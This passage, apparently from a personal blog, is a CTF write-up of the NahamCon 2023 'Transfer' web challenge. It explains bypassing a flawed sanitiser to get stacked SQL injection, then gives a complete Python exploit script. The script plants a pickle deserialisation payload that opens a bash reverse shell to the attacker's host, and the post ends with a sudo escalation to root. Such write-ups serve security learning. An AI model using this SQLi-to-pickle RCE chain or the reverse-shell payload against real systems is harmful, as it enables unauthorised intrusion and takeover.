+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">bad_char</span> <span class="ow">in</span> <span class="s2">&#34; &#39;</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">string</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="n">bad_char</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">string</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\\</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;&#39;&#34;</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Here if we provide, <code>&lt;space&gt;</code>, <code>'</code>, or <code>&quot;&quot;</code> then it removes it from the parameter. This removes the chance of SQL injection but the last line <code>string.replace(&quot;\\&quot;, &quot;'&quot;)</code> basically introduces the SQLi here.</p>
+<p>If the <code>DBClean</code> sees a <code>\</code> then it replaces it with <code>'</code> single quotation mark, allowing us to exploit the SQLi.</p>
+<p>Next thing to note is the usage of <code>executescript()</code> and <code>execute()</code> functions.</p>
+<div class="details admonition tip open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-lightbulb fa-fw" aria-hidden="true"></i>executescript()<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><ul>
+<li>executescript() is used to execute multiple SQL statements or an entire script.</li>
+<li>It takes a string argument containing one or more SQL statements.</li>
+<li>It can execute multiple queries separated by semicolons (;) or newline characters (\n).</li>
+<li>Unlike execute(), it does not return a cursor object.</li>
+<li>It automatically commits the changes to the database if no error occurs.</li>
+</ul>
+</div>
+        </div>
+    </div>
+<div class="details admonition tip open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-lightbulb fa-fw" aria-hidden="true"></i>execute()<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><ul>
+<li>execute() is used to execute a single SQL statement.</li>
+<li>It takes the SQL query as a string argument.</li>
+<li>It can be used with parameterized queries by passing a tuple or dictionary as the second argument.</li>
+<li>The method returns a cursor object that can be used to fetch the query results.</li>
+</ul>
+</div>
+        </div>
+    </div>
+<p>Our query with the username and password will go through <code>executescript()</code> first so we can have a payload containing multiple SQL queries.</p>
+<p>To inject the RCE payload into the files, the SQLi comes into play.</p>
+<p>First thing is to insert a malicious file into the files table. To do that, we&rsquo;ll need to pass the active sessions query and to pass the active sessions query, we need to insert a valid query in activesessions table.</p>
+<p>So we&rsquo;ll go through the following steps.</p>
+<ol>
+<li>Insert a valid active session into the database.</li>
+<li>Generate a payload for RCE.</li>
+<li>Insert the Payload into the file.</li>
+<li>Trigger the file to get the RCE.</li>
+</ol>
+<h3 id="inserting-a-valid-active-session">Inserting a valid active session</h3>
+<p>As we previously saw that the username parameter is first passed in <code>DBClean</code> function and then passed to <code>executescript()</code>. We can make a SQLi payload such that it leverages the SQLi, bypasses the <code>DBClean</code> sanitization and inserts a new active session to the DB.</p>
+<p>I&rsquo;ll run the exploit locally first by running the <code>app.py</code> file as <code>python3 app.py</code></p>
+<p>This will also create a <code>/tmp/database.db</code> file.</p>
+<p>The db schema is as follows.</p>
+<p><figure><a class="lightgallery" href="/nahamcon2023-web/35.png" title="sqlite3 db schema" data-thumbnail="/nahamcon2023-web/35.png" data-sub-html="<h2>sqlite3 db schema</h2><p>sqlite3 db schema</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/nahamcon2023-web/35.png"
+            data-srcset="/nahamcon2023-web/35.png, /nahamcon2023-web/35.png 1.5x, /nahamcon2023-web/35.png 2x"
+            data-sizes="auto"
+            alt="/nahamcon2023-web/35.png" width="650" height="69" />
+    </a><figcaption class="image-caption">sqlite3 db schema</figcaption>
+    </figure></p>
+<p>The <code>activesessions</code> table has three fields i.e. session_id, username and timestamp.</p>
+<p>The timestamp format can be seen from the <code>app.py</code>.</p>
+<p><code>c.executescript(f&quot;INSERT INTO activesessions (sessionid, timestamp) VALUES ('{session_id}', '{datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}')&quot;)</code></p>
+<p>Now the query to insert the active session into the DB.</p>
+<p>SQLi Query: <code>admin';\nINSERT INTO activesessions (sessionid, username, timestamp) VALUES ('123', 'saad', '2023-06-20/**/06:13:22.123456');--</code></p>
+<p>I made a function for reversing the <code>DBClean()</code> function such that if I provide the normal query it would convert into a version suitable for <code>DBClean()</code> function.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">DBRestore</span><span class="p">(</span><span class="n">string</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">string</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;&#39;&#34;</span><span class="p">,</span> <span class="s2">&#34;</span><span class="se">\\</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">string</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;</span><span class="si">%0a</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">string</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34; &#34;</span><span class="p">,</span> <span class="s2">&#34;/**/&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">string</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Credits for this idea goes to: <a href="https://www.youtube.com/watch?v=PbpDB0jlqbc&amp;ab_channel=Kr1ppl3r" target="_blank" rel="noopener noreffer ">https://www.youtube.com/watch?v=PbpDB0jlqbc&ab_channel=Kr1ppl3r</a></p>
+<h3 id="generating-a-payload-for-rce">Generating a payload for RCE</h3>
+<p>Make a class <code>doPickle</code> whose overall purpose is to create a payload that, when deserialized using pickle.loads(), will execute the specified payload as a command using os.system().</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">doPickle</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">class</span> <span class="nc">PickleRce</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">,</span> <span class="p">(</span><span class="n">payload</span><span class="p">,))</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">PickleRce</span><span class="p">()))</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Next is to create a reverse shell.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">encodedCommand</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;bash -i &gt;&amp; /dev/tcp/</span><span class="si">{</span><span class="n">LHOST</span><span class="si">}</span><span class="s1"> 0&gt;&amp;1&#39;</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">Command</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;echo &#34;</span><span class="si">{</span><span class="n">encodedCommand</span><span class="si">}</span><span class="s1">&#34; | base64 -d | bash &#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">picklePayload</span> <span class="o">=</span> <span class="n">doPickle</span><span class="p">(</span><span class="n">Command</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Reference: <a href="https://silver-4.gitbook.io/about/this-week/capture-the-flag/transfer" target="_blank" rel="noopener noreffer ">https://silver-4.gitbook.io/about/this-week/capture-the-flag/transfer</a></p>
+<h3 id="inserting-the-payload-into-the-files-table">Inserting the payload into the files table</h3>
+<p>From the schema, the files table takes in unique filename, blob data and valid session id.</p>
+<p>SQLi Query: <code>admin';\nINSERT INTO files (filename, data, sessionid) VALUES ('MYFILE', 'PICKLEPAYLOAD', '123');--</code></p>
+<p>Passing it through the <code>DBRestore</code> function I made, we can get the <code>DBClean</code> version of this.</p>
+<h3 id="final-script">Final Script</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pickle</span><span class="o">,</span> <span class="nn">requests</span> <span class="o">,</span><span class="nn">sys</span><span class="o">,</span> <span class="nn">random</span><span class="o">,</span> <span class="nn">base64</span><span class="o">,</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Specifying URL of the site and </span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">URL</span><span class="p">,</span> <span class="n">IP_PORT</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;:&#34;</span><span class="p">,</span> <span class="s2">&#34;/&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;(+) Target URL: </span><span class="si">{</span><span class="n">URL</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;(+) Your IP and PORT: </span><span class="si">{</span><span class="n">IP_PORT</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Function to make the pickle RCE payload</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">doPickle</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">class</span> <span class="nc">PickleRce</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">,</span> <span class="p">(</span><span class="n">payload</span><span class="p">,))</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">PickleRce</span><span class="p">()))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Function to trigger the RCE payload after inserting into the DB</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">triggerPayload</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;(+) Trigger payload&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;Host&#39;</span><span class="p">:</span> <span class="n">URL</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;Content-Type&#39;</span><span class="p">:</span> <span class="s1">&#39;application/x-www-form-urlencoded&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">endpoint</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">URL</span><span class="si">}</span><span class="s2">/download/</span><span class="si">{</span><span class="n">filename</span><span class="si">}</span><span class="s2">/123&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;(+) Endpoint: </span><span class="si">{</span><span class="n">endpoint</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">endpoint</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span><span class="o">.</span><span class="n">text</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl"><span class="c1"># Inverted Function for the DBClean sanitization</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">DBRestore</span><span class="p">(</span><span class="n">string</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">string</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;&#39;&#34;</span><span class="p">,</span> <span class="s2">&#34;</span><span class="se">\\</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">string</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;</span><span class="si">%0a</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">string</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34; &#34;</span><span class="p">,</span> <span class="s2">&#34;/**/&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">string</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl"><span class="c1"># Function to send the HTTP requests to /login endpoint for inserting different queries</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">sendRequest</span><span class="p">(</span><span class="n">description</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;(+) </span><span class="si">{</span><span class="n">description</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;Host&#39;</span><span class="p">:</span> <span class="n">URL</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;Content-Type&#39;</span><span class="p">:</span> <span class="s1">&#39;application/x-www-form-urlencoded&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;username=</span><span class="si">{</span><span class="n">data</span><span class="si">}</span><span class="s1">&amp;password=1&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">URL</span><span class="si">}</span><span class="s2">/login&#34;</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span><span class="o">.</span><span class="n">text</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Inserting an active session</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">DBRestore</span><span class="p">(</span><span class="s2">&#34;admin&#39;;</span><span class="se">\n</span><span class="s2">INSERT INTO activesessions (sessionid, username, timestamp) VALUES (&#39;123&#39;, &#39;saad&#39;, &#39;2023-06-20/**/06:13:22.123456&#39;);--&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">sendRequest</span><span class="p">(</span><span class="s2">&#34;Create session&#34;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Generating a random number for unique file name</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">randNum</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">10000</span><span class="p">,</span> <span class="mi">99999</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Generating the reverse shell and pickle payload</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">encodedCommand</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;bash -i &gt;&amp; /dev/tcp/</span><span class="si">{</span><span class="n">IP_PORT</span><span class="si">}</span><span class="s1"> 0&gt;&amp;1&#39;</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">Command</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;echo &#34;</span><span class="si">{</span><span class="n">encodedCommand</span><span class="si">}</span><span class="s1">&#34; | base64 -d | bash &#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">picklePayload</span> <span class="o">=</span> <span class="n">doPickle</span><span class="p">(</span><span class="n">Command</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Inserting file with payload into the DB</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">DBRestore</span><span class="p">(</span><span class="s2">&#34;admin&#39;;</span><span class="se">\n</span><span class="s2">INSERT INTO files (filename, data, sessionid) VALUES (&#39;MYFILE&#39;, &#39;PICKLEPAYLOAD&#39;, &#39;123&#39;);--&#34;</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;MYFILE&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">randNum</span><span class="p">))</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;PICKLEPAYLOAD&#34;</span><span class="p">,</span> <span class="n">picklePayload</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">sendRequest</span><span class="p">(</span><span class="s2">&#34;Create file&#34;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Triggering the payload to get RCE</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">triggerPayload</span><span class="p">(</span><span class="n">randNum</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Start the ngrok and nc listener and execute the script.</p>
+<p><figure><a class="lightgallery" href="/nahamcon2023-web/36.png" title="Executing the script" data-thumbnail="/nahamcon2023-web/36.png" data-sub-html="<h2>Executing the script</h2><p>Executing the script</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/nahamcon2023-web/36.png"
+            data-srcset="/nahamcon2023-web/36.png, /nahamcon2023-web/36.png 1.5x, /nahamcon2023-web/36.png 2x"
+            data-sizes="auto"
+            alt="/nahamcon2023-web/36.png" width="643" height="147" />
+    </a><figcaption class="image-caption">Executing the script</figcaption>
+    </figure></p>
+<p>We&rsquo;ll get a reverse shell as user <code>transfer</code>.</p>
+<p><code>sudo -l</code> reveals <code>(root) NOPASSWD: ALL</code>.</p>
+<p>Run <code>sudo su</code> to get shell as root and read the flag at <code>/root/flag.txt</code>.</p>
+<p><figure><a class="lightgallery" href="/nahamcon2023-web/37.png" title="Transfer Flag" data-thumbnail="/nahamcon2023-web/37.png" data-sub-html="<h2>Transfer Flag</h2><p>Transfer Flag</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/nahamcon2023-web/37.png"
+            data-srcset="/nahamcon2023-web/37.png, /nahamcon2023-web/37.png 1.5x, /nahamcon2023-web/37.png 2x"
+            data-sizes="auto"
+            alt="/nahamcon2023-web/37.png" width="768" height="473" />
+    </a><figcaption class="image-caption">Transfer Flag</figcaption>
+    </figure></p>
+<p><code>Flag: flag{8acde75d731975c7bccaf64f805f131f}</code></p>
+<p><strong>Thanks for reading</strong></p></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2023-06-22</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/nahamcon2023-web/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="/nahamcon2023-web/" data-title="NahamCon 2023 CTF - Web Challenges" data-via="ssaadakhtarr" data-hashtags="ctf,writeup,nahamcon2023"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="/nahamcon2023-web/" data-hashtag="ctf"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="/nahamcon2023-web/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/ctf/">ctf</a>,&nbsp;<a href="/tags/writeup/">writeup</a>,&nbsp;<a href="/tags/nahamcon2023/">nahamcon2023</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/hackweek23-ctf/" class="prev" rel="prev" title="HackWeek 2023 - CTF"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>HackWeek 2023 - CTF</a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.111.3">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Saad Akhtar</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
